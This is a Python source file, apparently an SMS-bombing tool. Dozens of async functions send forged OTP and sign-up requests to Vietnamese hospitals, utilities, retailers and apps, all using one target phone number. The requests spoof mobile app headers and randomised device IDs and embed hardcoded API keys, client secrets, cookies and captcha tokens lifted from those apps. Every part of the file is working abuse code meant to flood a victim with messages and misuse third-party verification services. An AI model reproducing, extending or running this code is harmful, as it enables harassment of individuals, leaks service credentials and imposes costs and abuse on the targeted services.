    json_data = {'phoneNumber': phone, 'type': 1, 'language': 1, 'provider': 2}
    try:

        response = await make_request('POST', _TGSS_URL, headers=headers, json=json_data)
        print(f"TGSS_OTP | -> OK         ")
    except Exception:
        print(f"TGSS_OTP | ~> Lỗi ")

async def daiichi(phone):
    auth_uuid = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    device_id = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    captcha = ''.join(random.choices(string.ascii_letters, k=6))
    headers = {
        'Content-Type': 'application/json',
        'Upload-Draft-Interop-Version': '6',
        'Connection': 'keep-alive',
        'Upload-Complete': '?1',
        'Accept': 'application/json',
        'User-Agent': 'mCP/2.1.85 (iPhone; iOS 18.1; Scale/3.00)',
        'Accept-Language': 'vi;q=1',
        'Accept-Encoding': 'gzip, deflate',
    }
    json_data = {
        'jsonDataInput': {
            'Action': 'RegisterAccountStep1',
            'Project': 'mCP',
            'FullName': random_vietnamese_name(),
            'Captcha': captcha,
            'Authentication': auth_uuid,
            'DeviceId': device_id,
            'OS': 'iOS',
            'Company': 'mcp',
            'UserLogin': phone,
        }
    }
    try:

        response = await make_request('POST', 'https://dlvncpapiext.dai-ichi-life.com.vn:8119/iibmobile/v1/CPRegisterAccountLink', headers=headers, json=json_data)

        print(f"DAIICHI | -> OK         ")
    except Exception:
        print(f"DAIICHI | ~> Lỗi ")

async def hqc247(phone):
    email = generate_email()
    password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '@288'
    headers = {
        'Accept': 'application/json',
        'x-os': 'ios',
        'merchant': 'HQC247_DEVICE',
        'checksum': 'd54be488f561cfb5e3fe1d389505b85039e9a3e61a016acf6ae96ec2a6a30da4',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'x-app': 'hqc247',
        'User-Agent': 'Hqc247/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'device': 'ios',
        'usertoken': '',
    }
    json_data = {
        'sub_store': '1',
        'password_confirmation': password,
        'password': password,
        'email': email,
        'fullname': random_vietnamese_name(),
        'phone': phone,
        'store': 0,
    }
    try:

        response = await make_request('POST', 'https://hqc247.hangnoidiachina.vn/api/customer/register', headers=headers, json=json_data)

        print(f"HQC247 | -> OK         ")
    except Exception:
        print(f"HQC247 | ~> Lỗi ")

async def toptop(phone):
    session_id = '-'.join([
        ''.join(random.choices(string.hexdigits.lower(), k=8)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=12)),
    ])
    req_id = '-'.join([
        ''.join(random.choices(string.hexdigits.lower(), k=8)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=12)),
    ])
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Accept': 'application/json, text/plain, */*',
        'p-signature': 'MEQCIFcwpsGzcHEPG7Uq5VAwYSO5/kz+QFkY7xMOrCJDbksEAiB0t3+cV7sGAPhenV5IshOz0as9oISGJp7/H5GUHW27dw==',
        'p-request-time': time.strftime('%Y%m%d%H%M%S'),
        'p-tenant': 'TOPTOP-MOBILE',
        'p-device-model': 'iPhone 12 Pro',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'p-app-version': 'Auth_1.0.24_2',
        'p-lang': 'vi',
        'p-request-id': req_id,
        'p-device-id': 'CCBABDA4-E176-4275-B66D-57310B4B61D1',
        'User-Agent': 'TopTop/3 CFNetwork/1568.200.51 Darwin/24.1.0',
        'p-os-version': 'Ios 18.1',
        'Content-Type': 'application/json',
    }
    json_data = {
        'api': '/personal-service/api/v1.0/profile/signup',
        'receiver': phone,
        'sessionId': session_id,
    }
    try:

        response = await make_request('POST', 'https://api.toptop.vn/auth-service/api/v1.0/otp/create', headers=headers, json=json_data)

        print(f"TOPTOP | -> OK         ")
    except Exception:
        print(f"TOPTOP | ~> Lỗi ")

async def jobsgo(phone):
    device_token = '-'.join([
        ''.join(random.choices(string.hexdigits.lower(), k=8)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=12)),
    ])
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'hope-token': '',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'User-Agent': 'JobsGO/1 CFNetwork/1568.200.51 Darwin/24.1.0',
    }
    data = f'phone={phone}&device_token={device_token}&android_advertising_id={device_token}'
    try:

        response = await make_request('POST', 'https://admin.jobsgo.vn/api/v2/login/verify-zalo', headers=headers, data=data)

        print(f"JOBSGO | -> OK         ")
    except Exception:
        print(f"JOBSGO | ~> Lỗi ")

async def isofhcare1(phone):
    import hashlib as _hl
    device_id = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    password = _hl.md5(''.join(random.choices(string.ascii_letters + string.digits, k=10)).encode()).hexdigest()
    headers = {
        'devicetype': 'mobile',
        'Accept': 'application/json, text/plain, */*',
        'appversion': '18.18',
        'source': 'bvdkdongda',
        'Accept-Language': 'vi-VN,vi;',
        'deviceos': 'ios 18.1',
        'Content-Type': 'application/json',
        'deviceid': device_id,
        'User-Agent': 'BVDKDongDa/18 CFNetwork/1568.200.51 Darwin/24.1.0',
        'mobilemode': 'user',
    }
    json_data = {
        'user': {
            'name': '',
            'password': password,
            'role': 1,
            'telephoneNumber': {'number': phone, 'dialingCode': '+84'},
        },
        'isofhcareCode': '',
        'socialType': 1,
    }
    try:

        response = await make_request('POST', 'https://api-produce.isofhcare.com/isofhcare/user/register', headers=headers, json=json_data)
        print(f"ISOFH1 | -> OK         ")
    except Exception:
        print(f"ISOFH1 | ~> Lỗi ")

async def isofhcare2(phone):
    import hashlib as _hl
    device_id = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    password = _hl.md5(''.join(random.choices(string.ascii_letters + string.digits, k=10)).encode()).hexdigest()
    headers = {
        'devicetype': 'mobile',
        'Accept': 'application/json, text/plain, */*',
        'appversion': '10.0.116',
        'source': 'nhidongthanhpho',
        'Accept-Language': 'vi-VN,vi;',
        'deviceos': 'ios 18.1',
        'Content-Type': 'application/json',
        'deviceid': device_id,
        'User-Agent': 'BenhVienNhiDong/116 CFNetwork/1568.200.51 Darwin/24.1.0',
        'mobilemode': 'user',
    }
    json_data = {
        'user': {
            'name': '',
            'password': password,
            'role': 1,
            'telephoneNumber': {'number': phone, 'dialingCode': '+84'},
        },
        'isofhcareCode': '',
        'socialType': 1,
    }
    try:

        response = await make_request('POST', 'https://api-produce.isofhcare.com/isofhcare/user/register', headers=headers, json=json_data)
        print(f"ISOFH2 | -> OK         ")
    except Exception:
        print(f"ISOFH2 | ~> Lỗi ")

async def thucuc(phone):
    headers = {
        'Cookie': 'session_id=0de36c415f4375ec6b2285570071368ebc81f686',
        'Accept': 'application/json,',
        'api-key': 'd7cacf779fdc8a543f39575d96db56e3',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'User-Agent': 'ThuCucBeauty/2 CFNetwork/1568.200.51 Darwin/24.1.0',
    }
    try:

        response = await make_request('GET', f'https://apps.thammythucuc.vn/api/v1.0/otp/{phone}', headers=headers)

        print(f"THUCUC | -> OK         ")
    except Exception:
        print(f"THUCUC | ~> Lỗi ")

async def utop(phone):
    trace_id = ''.join(random.choices('0123456789abcdef', k=32))
    span_id = ''.join(random.choices('0123456789abcdef', k=16))
    device_id = '%08X-%04X-4%03X-%04X-%012X' % (
        random.randint(0, 0xFFFFFFFF),
        random.randint(0, 0xFFFF),
        random.randint(0, 0xFFF),
        random.randint(0x8000, 0xBFFF),
        random.randint(0, 0xFFFFFFFFFFFF),
    )
    headers = {
        'Accept': 'application/json; charset=utf-8',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json',
        'User-Agent': 'Utop/3735 CFNetwork/1568.200.51 Darwin/24.1.0',
        'device-os': 'ios-18.1',
        'app-version': '2.2.57',
        'api-version': 'v2',
        'e_platform': 'mobile',
        'ocp-apim-subscription-key': 'fc5468a45d9d42038264648021c58eca',
        'sentry-trace': f'{trace_id}-{span_id}-0',
        'baggage': f'sentry-environment=production,sentry-public_key=b3d2bc79ad454d67a35fc999bfb60cec,sentry-release=com.ges.uTop%402.2.57%2B3735,sentry-trace_id={trace_id}',
    }
    json_data = {
        'phoneNumber': phone,
        'deviceId': device_id,
        'isRetry': False,
    }
    try:

        response = await make_request('POST', 'https://api.utopapp.net/otp/RequestOTP', headers=headers, json=json_data)

        print(f"UTOP | -> OK         ")
    except Exception:
        print(f"UTOP | ~> Lỗi ")

async def menaselect(phone):
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-ReCaptcha': '',
        'X-Requested-With': 'XMLHttpRequest',
    }
    json_data = {
        'telephone': phone,
        'sender': 'zns',
    }
    try:

        response = await make_request('POST', 'https://menaselect.com/rest/V1/mobileapi/customer/sendOTP', headers=headers, json=json_data)

        print(f"MENASELECT | -> OK         ")
    except Exception:
        print(f"MENASELECT | ~> Lỗi ")

# ── Constants (from moi.py) ─────────────────────────────────────────────────
_VNVC_CLIENTID = (
    "107g/8biyKzmhIZ0k5wMUvwERuyGQXzRU03kT4SdIiBySPxtiHcdkNAK/kNDJBpHMp9DC+Isc++"
    "kR/VTgKuOVTynxz+tkRGFy7+3CmL1xYCMIEHia/nuCjEVc2YUnhTGVMQ6okMVs8pvOwQbSbrFzo"
    "5Na6uHeGcBHZg/0bCPlcdmX877nooWOs2GbzR0b5wS8BXBC3VogYSfNXhHVFUFzuJ3gV7vOm/AR"
    "2LAOdNgcBUlBY3iddrNjxA9DoWWSwXGrFHTJSJ61fqBhzFDc+Ai+dvz4ZCVRfP9HQWxLBWrMn8S"
    "JYh44/tJvFDxLXchhOjcgWymHh6IYS8ucad9k0uM/g=="
)
_VNVC_APIKEY = "62be5c0bd22044dc847297c33f657dc8"

_VEXERE_CLIENT_ID     = "5d72a6b4-b307-4232-8df9-bf78d1a0b6fd"
_VEXERE_CLIENT_SECRET = "d8c2b221-2f73-490f-9dab-8be2b2fc0545"
_vexere_cached_token  = ""
_vexere_token_exp     = 0.0

_FIKSGO_CAPTCHA = (
    "CN31_ycFtwHbp*44Q0z_5gyrFFIRjNAJUlGyE.glaT0OcvmysdOhihS*YCp.*aWNWyKdG9JjXNZd2."
    "eoaKRXfkQP_1pZzgG2d8cuxHbrKzw6v2wLwL22uNfF1GzGx5Kjlsh_qBBiyYf8y9PebRUJxGSqKwW."
    "S*ek0TUYvyytBLcCrtxdQqgmKVAVmpvK5z8bMUisoJzwczd1T*QGy130MA5JUOy0R*UZG63tz.5fSs"
    "wjSZrBAu2shFtuCR1_flYck2n8eQl12YxrRZG6QRPoRuGKFTSvDHugjHKU_Z8Hac9Qrxnvi88JT0fg"
    "NAv.PkBEZNjgBVGAADbBzv0gLdRdX.bKrq*QqdIJpaJBvc5W3kedRt3qAKD_4hjEM*UfMk9AtcI*56"
    "*4CGl3YMzPCJRSK.8.mccUF3_OHl0e8K3*fnyvwJ4TGCIe_NPbSzqpLRMGrUctUbiKPXQtWfMruMM5"
    "6kuplEuO6hR5haC_fC9cCEcgZyesb2O2y9SqKkUeQTfXrF1awCPQo*g77_v_i_1"
)


async def tgss2(phone):
    client_id = '-'.join([
        ''.join(random.choices(string.hexdigits.lower(), k=8)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=4)),
        ''.join(random.choices(string.hexdigits.lower(), k=12)),
    ])
    headers = {
        'user-agent': 'Dart/3.8 (dart:io)',
        'appchecktoken': 'eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjkxMTY5MDg2ODkyOTppb3M6NTM5MzEyNjY2ZDJmMjdhNyIsImF1ZCI6WyJwcm9qZWN0cy85MTE2OTA4Njg5MjkiXSwicHJvdmlkZXIiOiJkZXZpY2VfY2hlY2tfYXBwX2F0dGVzdCIsImlzcyI6Imh0dHBzOi8vZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbS85MTE2OTA4Njg5MjkiLCJleHAiOjE3ODMzODYzMDcsImlhdCI6MTc4MzM4MjcwN30.signature',
        'clientid': client_id,
        'content-type': 'application/json',
        'accept-encoding': 'gzip',
    }
    json_data = {
        'phoneNumber': phone,
        'type': 1,
        'language': 1,
        'provider': 2,
    }
    try:

        response = await make_request('POST', 'https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/otp/send-app', headers=headers, json=json_data)
        print(f"TGSS2 | -> OK         ")
    except Exception:
        print(f"TGSS2 | ~> Lỗi ")


async def dichvunuoc(phone):
    x_request_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
    trace_id = uuid.uuid4().hex
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'sentry-trace': f'{trace_id}-{uuid.uuid4().hex[:16]}',
        'x-request-id': x_request_id,
        'User-Agent': 'ProconsWater/1769963006 CFNetwork/1568.200.51 Darwin/24.1.0',
        'x-platform': 'ios',
        'x-app-version': '1.0.0',
        'Content-Type': 'application/json',
    }
    json_data = {
        'userName': phone,
        'passwordHash': 'Trong@288',
    }
    try:

        response = await make_request('POST', 'https://api.dichvunuoc.vn/api/AppUser/register', headers=headers, json=json_data)
        print(f"DichVuNuoc | -> OK         ")
    except Exception:
        print(f"DichVuNuoc | ~> Lỗi ")


async def bwaco(phone):
    try:

        response = await make_request('POST', 
            'https://apiappcskh.bwaco.com.vn/api/EOSVT/Register',
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': 'app_customer_care/1 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            json={'phoneNumber': phone, 'password': 'Trong@2808'},

        )
        print(f"BWaCo | -> OK -> ")
    except Exception:
        print(f"BWaCo | ~> Lỗi ")


async def dowaco(phone):
    try:

        response = await make_request('POST', 
            'https://apicskh.dowaco.vn/v1/api/Cus/sendOTP',
            headers={
                'Host': 'apicskh.dowaco.vn',
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'CSKH/4 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            json={'sdt': phone, 'type': 'register'},

        )
        print(f"DoWaCo | -> OK -> ")
    except Exception:
        print(f"DoWaCo | ~> Lỗi ")


async def speed(phone):
    try:

        response = await make_request('POST', 
            'https://www.lottemart.vn/v1/p/mart/bos/vi_cgy/V1/mart-sms/sendotp',
            headers={
                'accept': 'application/json',
                'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                'origin': 'https://www.lottemart.vn',
                'referer': 'https://www.lottemart.vn/signup',
                'user-agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                    'Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0'
                ),
            },
            cookies={
                '__Host-next-auth.csrf-token': (
                    '96e389c6a786ef46caac7648491f4d5d222e8879ca05d430640b0d128745a80a'
                    '%7C1c26f703ca57929ea5c3fc53da31d6084a4c216896836b48a36cb4c867401e2b'
                ),
                '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
            },
            json={'username': phone, 'case': 'register'},

        )
        print(f"LotteMart | -> OK -> ")
    except Exception:
        print(f"LotteMart | ~> Lỗi ")


async def _vexere_get_token_sync():
    global _vexere_cached_token, _vexere_token_exp
    if _vexere_cached_token and time.time() < _vexere_token_exp - 60:
        return _vexere_cached_token
    try:

        response = await make_request('POST', 
            'https://account-service.vexere.com/v1/oauth/token',
            headers={
                'Content-Type': 'application/json;charset=utf-8',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'User-Agent': 'VeXeRe/613 CFNetwork/1568.200.51 Darwin/24.1.0',
            },
            json={
                'grant_type': 'client_credentials',
                'client_id': _VEXERE_CLIENT_ID,
                'client_secret': _VEXERE_CLIENT_SECRET,
            },

        )
        d = resp.json()
        token = d.get('access_token', '')
        expires_in = float(d.get('expires_in', 3600))
        if token:
            _vexere_cached_token = token
            _vexere_token_exp = time.time() + expires_in
        return token or None
    except Exception:
        return None


async def vexere(phone):
    try:
        token = await _vexere_get_token_sync()
        if not token:
            print(f"VeXeRe | X (token) -> IP thật")
            return
        data = (
            'lang=vi-VN'
            f'&phone=%2B84{phone.lstrip("0")}'
            '&provider=sms'
            '&template=%24OTP%20la%20ma%20xac%20thuc%20VEXERE%20cua%20ban.'
            '%20Ma%20nay%20se%20het%20han%20sau%20%24TTL%20phut.'
            '%20Code%3A%20%24OTP%20'
        )

        response = await make_request('POST', 
            'https://user-profile-service.vexere.com/v2/auth/send_otp',
            headers={
                'Host': 'user-profile-service.vexere.com',
                'origin-request-product': 'APP_VPASSENGER',
                'origin-request-id': str(uuid.uuid4()),
                'Accept': 'application/json',
                'Authorization': f'Bearer {token}',
                'Accept-Language': 'vi-VN',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'VeXeRe/613 CFNetwork/1568.200.51 Darwin/24.1.0',
            },
            data=data.encode(),

        )
        print(f"VeXeRe | -> OK -> ")
    except Exception:
        print(f"VeXeRe | ~> Lỗi ")


async def fiksgo(phone):
    try:

        response = await make_request('POST', 
            'http://api.fiksgo.com/app/user/sms/send',
            headers={
                'system': 'ios',
                'Accept': '*/*',
                'bundleId': 'com.fiksgo123.go',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'ver': '1.0.1',
                'tag': 'v',
                'User-Agent': 'RecruitmentService/1 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Content-Type': 'application/json',
            },
            json={'account': phone, 'captcha': _FIKSGO_CAPTCHA},

        )
        print(f"Fiksgo | -> OK -> ")
    except Exception:
        print(f"Fiksgo | ~> Lỗi ")


async def sentSms_BVSante(phone):
    try:

        response = await make_request('POST', 
            'https://app.bvsante.com:32309/caresbook2/auth/register',
            headers={
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'User-Agent': 'ytedongthap/27 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            json={
                'password': 'Trongok@288',
                'rawPassword': 'Trongok@288',
                'changeInfo': False,
                'username': phone,
                'typeVerify': 'phone',
            },

        )
        print(f"BVSante | -> OK -> ")
    except Exception:
        print(f"BVSante | ~> Lỗi ")


async def sentSms_BVPDVn(phone):
    try:

        response = await make_request('POST', 
            'https://apps.bvpd.vn/api/caresbook2/auth/register',
            headers={
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'User-Agent': 'ytedongthap/60 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            json={
                'password': 'Trong@288',
                'rawPassword': 'Trong@288',
                'changeInfo': False,
                'username': phone,
                'typeVerify': 'phone',
            },

        )
        print(f"BVPDVn | -> OK -> ")
    except Exception:
        print(f"BVPDVn | ~> Lỗi ")


async def sentSms_GiupViecTot(phone):
    try:

        response = await make_request('POST', 
            'https://noibo.giupviectot.vn/appcus/getPassword',
            headers={
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Fetch-Site': 'same-origin',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Sec-Fetch-Mode': 'cors',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://noibo.giupviectot.vn',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)',
                'Referer': 'https://noibo.giupviectot.vn/appcus/login',
                'Sec-Fetch-Dest': 'empty',
            },
            cookies={'gvt_app': 'false'},
            data={'login_account': phone},

        )
        print(f"GiupViecTot | -> OK -> ")
    except Exception:
        print(f"GiupViecTot | ~> Lỗi ")


async def demxinh_lienhe(phone):
    try:

        response = await make_request('POST', 
            'https://demxinh.vn/aj/box/cPOP/',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Origin': 'https://demxinh.vn',
                'Referer': 'https://demxinh.vn/',
            },
            data={
                'name_contact': random_vietnamese_name(),
                'phone_contact': phone,
                'return': ''.join(random.choices(string.ascii_lowercase + string.digits, k=25)),
            },
        )
        print(f"DemXinh | -> OK -> ")
    except Exception:
        print(f"DemXinh | ~> Lỗi ")


async def moneyhcm24h_otp(phone):
    phone84 = '+84' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    try:

        response = await make_request('POST', 
            f'https://api2-t19.24hmoney.vn/v1/ios/auth/otp/send-direct-only?platform=ios&device_id=4C8FF208-7A43-4806-8427-1E9BAFADAC17&app_version=6.2.3&locale=vi&device_name=iPhone&device_model=iPhone13,3&network_carrier=--&os=ios&os_version=18.1&access_token=INVALID&push_token={"".join(random.choices("0123456789ABCDEF", k=64))}&cp_version=a482',
            headers={
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://app-native.24hmoney.vn',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
                'Referer': 'https://app-native.24hmoney.vn/',
            },
            data={'request_phone': phone84, 'partner': 'vmg'},
        )
        print(f"24hMoney | -> OK -> ")
    except Exception:
        print(f"24hMoney | ~> Lỗi ")


async def _medpro_send(phone, app_id, partner_id, os_token, label):
    try:

        response = await make_request('POST', 
            'https://api-120.medpro.com.vn/user/phone-register',
            headers={
                'appid': app_id,
                'Accept': 'application/json, text/plain, */*',
                'partnerid': partner_id,
                'version': '1.2.14',
                'momoid': '',
                'locale': '',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'osid': str(uuid.uuid4()),
                'platform': 'ios',
                'User-Agent': 'MEDPRO/12140 CFNetwork/1568.200.51 Darwin/24.1.0',
                'cskhtoken': '',
                'ostoken': os_token,
                'Content-Type': 'application/json;charset=utf-8',
            },
            json={
                'deviceId': str(uuid.uuid4()).upper(),
                'fullname': 'User Medpro',
                'phone': phone,
                'type': 'password',
            },

        )
        print(f"{label} | -> OK -> ")
    except Exception:
        print(f"{label} | ~> Lỗi ")


async def sentSms_Medpro_HoanMy(phone):
    await _medpro_send(
        phone,
        app_id='hoanmytd', partner_id='hoanmytd',
        os_token='937a4199bd950daaeac9e35912eaa2ca2c0b4481ac800208d78d3357c8038b81',
        label='Medpro-HoanMy',
    )


async def sentSms_Medpro_DaLieu(phone):
    await _medpro_send(
        phone,
        app_id='dalieuhcm', partner_id='dalieuhcm',
        os_token='527a247d16f013fe71d09a94a1ea2dd7548fe2edbfcc8ceef30ee54cd7c32c0e',
        label='Medpro-DaLieu',
    )


async def sentSms_Medpro_UMC2(phone):
    await _medpro_send(
        phone,
        app_id='umc2', partner_id='umc2',
        os_token='61335a78804d09d5e250579f4b60a18be18f622c38e24775474bdcaae5eb5635',
        label='Medpro-UMC2',
    )


async def hihihi1(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    try:

        response = await make_request('POST', 
            'https://apiappcskh.trungtamnuocbrvt.com.vn/api/EOSVT/Register',
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'User-Agent': 'app_customer_care/1 CFNetwork/1568.200.51 Darwin/24.1.0',
            },
            json={'phoneNumber': phone_fmt, 'password': 'Trong@2808'},

        )

        print(f"trungtamnuocbrvt | -> OK -> ")
    except Exception:
        print(f"trungtamnuocbrvt | ~> Lỗi ")


async def hihihi2(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    try:

        response = await make_request('POST', 
            'https://apiappcskh.pmw.vn/api/EOSVT/Register',
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'User-Agent': 'app_customer_care/1 CFNetwork/1568.200.51 Darwin/24.1.0',
            },
            json={'phoneNumber': phone_fmt, 'password': 'Trong@2808'},

        )
        print(f"pmw | -> OK -> ")
    except Exception:
        print(f"pmw | ~> Lỗi ")


async def hihihi3(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    try:

        response = await make_request('POST', 
            'https://eco-app-api.e-plus.vn/api/app/Otp/request',
            headers={
                'Content-Type': 'application/json;charset=utf-8',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'User-Agent': 'VNVC/65 CFNetwork/1568.200.51 Darwin/24.1.0',
                'x-clientid': _VNVC_CLIENTID,
                'x-apikey': _VNVC_APIKEY,
            },
            json={'phone': phone_fmt, 'requestType': 'authenticate', 'source': 'vnvc'},

        )
        print(f"vnvc | -> OK -> ")
    except Exception:
        print(f"vnvc | ~> Lỗi ")


async def kaka8(phone):
    device_token = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
    try:

        response = await make_request('POST', 
            'https://gw.be.com.vn/api/v1/be-autos/v4/customer/generate_login_otp',
            params={'source': 'ios_customer', 'version': '36179'},
            headers={
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'Accept': '*/*',
                'User-Agent': 'BeSDK_iOS_1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'access_token': '',
            },
            data={
                'access_token': '',
                'ad_id': '',
                'app_version': '36179',
                'client_id': 'EEBUOvQq7RRJBxJm',
                'client_info[screen_width]': '390',
                'client_info[sdkVersion]': '1.0',
                'client_info[screen_height]': '844',
                'client_info[client_id]': 'EEBUOvQq7RRJBxJm',
                'client_info[version]': '3.6.179',
                'client_info[latitude]': '0',
                'client_info[platform]': 'ios',
                'client_info[modelId]': 'iPhone13,3',
                'client_info[integrated]': '1',
                'client_info[macAddress]': '7CE3E963-48F2-4068-8C4B-91CD02C312AA',
                'client_info[unique_device_id]': '2880e876c32a4f89ad03f739757a838da16215831b3e89071dfdb9af01ba2c6a',
                'client_info[os_version]': '18.1',
                'client_info[device_name]': 'iPhone 12 Pro',
                'client_info[device_type]': '1',
                'client_info[device_token]': '2880e876c32a4f89ad03f739757a838da16215831b3e89071dfdb9af01ba2c6a',
                'client_info[locale]': 'vi',
                'client_info[device_rooted]': '0',
                'client_info[longitude]': '0',
                'client_info[operator_token]': '0b28e008bc323838f5ec84f718ef11e6',
                'client_info[location][longitude]': '0',
                'client_info[location][latitude]': '0',
                'client_info[env]': 'prod',
                'client_info[customer_package_name]': 'xyz.be.customer',
                'client_info[ad_id]': '',
                'client_info[ip]': '2001:4860:482b:7700::',
                'client_info[app_version]': '36179',
                'client_info[network_info][provider]': '--',
                'client_info[network_info][ip]': '2401:d800:23d:d4d9:f1b8:3725:975f:c479',
                'client_info[network_info][network_type]': 'Reachable through Cellular',
                'country_code': '+84',
                'customer_package_name': 'xyz.be.customer',
                'device_name': 'iPhone 12 Pro',
                'device_rooted': '0',
                'device_token': device_token,
                'device_type': '1',
                'env': 'prod',
                'integrated': '1',
                'ip': '2001:4860:482b:7700::',
                'locale': 'vi',
                'location[longitude]': '0',
                'location[latitude]': '0',
                'macAddress': '7CE3E963-48F2-4068-8C4B-91CD02C312AA',
                'modelId': 'iPhone13,3',
                'network_info[provider]': '--',
                'network_info[ip]': '2401:d800:23d:d4d9:f1b8:3725:975f:c479',
                'network_info[network_type]': 'Reachable through Cellular',
                'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
                'os_version': '18.1',
                'otp_type': '3',
                'phone_no': phone,
                'platform': 'ios',
